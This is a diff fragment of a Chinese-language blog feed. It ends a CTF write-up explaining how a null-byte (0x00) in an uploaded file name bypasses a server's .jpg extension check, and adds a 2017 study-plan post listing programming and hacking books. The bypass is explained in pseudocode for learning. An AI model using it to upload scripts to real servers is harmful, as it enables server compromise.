末尾只能以.jpg（或.gif、.png）结尾，无法用大小写绕过、特别文件名构造等方式。</p></blockquote><p>看writeup，利用了00（php是由C写的，C语言中%00是截断符，一旦看到%00，就停止执行）</p><p>参考：<a href="http://www.cnblogs.com/cyjaysun/p/4439058.html">上传验证绕过全解析</a></p><p>可以知道，这个是<strong>服务端验证方式</strong>（通过在服务端<strong>查看上传的文件是否符合要求</strong>）</p><blockquote><p>** 0x00 截断绕过** -  这个是基于一个组合逻辑漏洞造成的</p><p>给个简单的伪代码</p><p>name = getname(http request) //假如这时候获取到的文件名是 help.asp<br>.jpg(asp 后面为 0x00)</p><p>type = gettype(name) //而在<br>gettype()函数里处理方式是<strong>从后往前扫描扩展名</strong>，所以判断为 jpg if<br>(type == jpg)</p><p>SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00<br>作为文件名截断</p><p>//最后以 help.asp 存入路径里<br>:::<br>:::<br>:::</p></blockquote>]]></content>
+    
+    
     
   </entry>
   
@@ -6224,6 +6563,25 @@
       <category>experience</category>
       
     </categories>
+    
+    
+    <tags>
+      
+      <tag>experience</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>2017我的课程表</title>
+    <link href="/2017/01/01/2017%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A8/"/>
+    <url>/2017/01/01/2017%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A8/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br>自学，找出问题，提问</p><p>thinking by your own brain</p><p>doing by your own hand</p><p>raising up your own opinion</p><p>sharing with your partner</p><hr><p><strong>公开课：</strong></p><p>哈佛大学公开课，<a href="http://open.163.com/special/opencourse/cs50.html">计算机科学导论</a> </p><p><strong>书籍资源：</strong></p><p>内功《从python开始学编程》.…已看完</p><p>       《python核心编程》(第二版)**<strong>《core python<br>programming（2rd）》</strong><br>**</p><p>**                             **<br>第二版比第三版对初学者更加友好，如果语言过关，建议读原版，翻译以及代码辣鸡。</p><p>**      ** 《python高级编程》**…… 39/324<br>**</p><p>       《python源码剖析》 511<br>python是用c写的，当然也有其他语言实现的不过这里不提。这本书建议你写了很多c和c++程序和python脚本后再看。</p><p>     *《black hat python》**\</p><hr><p>     《gray hat python》87/209</p><p>     《violent python A cookbook for hackers, Forensic Analysts,<br>Penetration Testers and Security Engineers》</p><p>                   <br>这本书，示例了各种用来暴力破解的脚本。只要需要密码的场合，可以使用脚本快速穷举正确密码。</p><hr><p>《穿越计算机的迷雾》…… 已看完</p><p><strong>《程序员的自我修养》</strong>67/483</p><p>《c语言程序设计》孙亚飞，川大教科书。.........已看完</p><p>**《the c programming language》p59/295 <br>**</p><p><strong>《鸟哥的linux私房菜》</strong>…… ing</p><p>《精通正则表达式》……</p><p>招式《木马技术揭秘与防御》黑客防线，2011出版.….<strong>page239.已看完</strong>（五颗星，从代码层面剖析了木马源码，由浅到深，适合新手）</p><p>        <br>《黑客攻防编程解析》黑防·.潘志翔2003年出版（两颗星，前部分基本东西讲了一堆，但实际操作却极度依赖IDE，可视化编程平台，不利于后续学习，容易把新手带歪。这本书只能参考参考）</p><p>          《木马攻防全攻略》万立夫，2009年</p><p>一本好书（这里指的是技术书籍）不应该仅仅是知识的堆砌，而是作者为读者考虑了并且将TA的思想在书中表达出来。一本书不可能囊括所有的东西，所以书的内容也要有指向性，懂的东西多说，不懂的东西少说或者不说。</p><p>书的好坏和出版时间也有一定关系吧，但是好的书一定是技术可能过时，但思想不会过时。一些书，可能作者罗列了一大堆知识，但从未自己思考过为什么、怎么来的，一旦书中的东西不再适应时代了，这本书就没有任何价值了。</p><p>一些书我看过以后打上等级，谨表个人意见。</p><hr><p>技能点：提高编程能力。</p><p>从2017年1月1日开始执行，over。</p><hr><p>2017年末总结，没想到，今年生了一场病还休学了。幸好的是，花费了几个月，我又恢复了健康。</p><p>这里要奉劝大家，不要等到失去健康才知道后悔，要注意保重身体啊！</p><p>学习方面，学得东西太散了，那谁说的没错，我应该专注一个小方面，而不是想什么都学一点……</p><p>11月27日更新。今年学习了python，从一窍不通到可以写出小脚本。不过要写攻击和检测程序还差得远。</p><p>关于c语言、汇编还有c++，自我感觉学了跟没学一样，根本不能用（融会贯通）。 </p><p>正则表达式和数据结构也大概学了下。。。没有投入足够的时间，倒不如说是方向不明确的学，导致效果不佳。</p><p>英语和colemak盲打得到了充分锻炼，自我感觉学的还不错。阅读文档勉勉强强，听力和写作还完全不行。<br>:::<br>:::<br>:::</p>]]></content>
+    
     
     
     <tags>
